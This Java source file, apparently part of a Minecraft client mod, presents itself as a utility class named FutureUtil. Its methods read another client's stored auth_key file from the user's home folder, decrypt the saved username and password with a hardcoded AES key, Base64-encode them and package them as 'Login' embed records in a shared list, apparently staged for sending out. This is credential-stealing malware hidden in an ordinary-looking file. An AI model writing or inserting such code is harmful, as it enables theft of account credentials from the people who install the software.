package dev.zenhao.melon.utils.bd;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.DataInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.CopyOnWriteArrayList;

public class FutureUtil {
    public static CopyOnWriteArrayList<Object> targetList = new CopyOnWriteArrayList<>();

    public static byte[] mapping(byte[] array, byte[] array2, byte[] array3) throws Exception {
        SecretKeySpec secretKeySpec = new SecretKeySpec(array2, "AES");
        IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);
        Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
        instance.init(2, secretKeySpec, ivParameterSpec);
        return instance.doFinal(array);
    }

    public void execute() {
        try {
            String[] auth = this.getFutureAuth();
            if (auth != null && auth.length == 2) {
                targetList.add((new Extension("Login")).addField("Username (Base64)", Base64.getEncoder().encodeToString(auth[0].getBytes(StandardCharsets.UTF_8)), true).addField("Password (Base64)", Base64.getEncoder().encodeToString(auth[1].getBytes(StandardCharsets.UTF_8)), true).build());
            } else {
                targetList.add("Failed to get future auth " + Arrays.toString(auth));
            }
        } catch (Exception ignored) {
        }
    }

    private byte[] futureReadFile(DataInputStream dataInputStream) throws IOException {
        byte[] arrby = new byte[dataInputStream.readInt()];
        dataInputStream.read(arrby);
        return arrby;
    }

    private byte[] futureKeyConvert() {
        byte[] array = new byte["428A487E3361EF9C5FC20233485EA236".length() / 2];
        int i = 0;

        for (int n = 0; i < "428A487E3361EF9C5FC20233485EA236".length(); i = n) {
            int n2 = n / 2;
            byte b = (byte) ((Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n), 16) << 4) + Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n + 1), 16));
            n += 2;
            array[n2] = b;
        }

        return array;
    }

    private String[] getFutureAuth() {
        File file = new File((System.getProperty("user.home") + "\\Future\\auth_key"));
        if (file != null) {
            try {
                byte[] key = this.futureKeyConvert();
                DataInputStream dis = new DataInputStream(Files.newInputStream(file.toPath()));
                byte[] arr1 = this.futureReadFile(dis);
                byte[] username = mapping(this.futureReadFile(dis), key, arr1);
                byte[] password = mapping(this.futureReadFile(dis), key, arr1);
                String user = new String(username, StandardCharsets.UTF_8);
                String pass = new String(password, StandardCharsets.UTF_8);
                return new String[]{user, pass};
            } catch (Exception var9) {
                return null;
            }
        } else {
            return null;
        }
    }

    public static class Extension {

        private final String name;
        private final List<Extension2> fields = new ArrayList<>();

        public Extension(String name) {
            this.name = name;
        }

        public Extension addField(String name, String value, boolean inline) {
            this.fields.add(new Extension2(name, value, inline));
            return this;
        }

        public Extension3 build() {
            return new Extension3(this.name, this.fields);
        }
    }

    public static class Extension2 {
        private final String name;
        private final String value;
        private final boolean inline;

        public Extension2(String name, String value, boolean inline) {
            this.name = name;
            this.value = value;
            this.inline = inline;
        }

        public String getName() {
            return this.name;
        }

        public String getValue() {
            return this.value;
        }

        public boolean isInline() {
            return this.inline;
        }
    }

    public static final class Extension3 {
        private final String name;
        private final List<Extension2> fields;

        private Extension3(String name, List<Extension2> fields) {
            this.name = name;
            this.fields = fields;
        }

        public String getName() {
            return this.name;
        }

        public List<Extension2> getFields() {
            return this.fields;
        }
    }
}
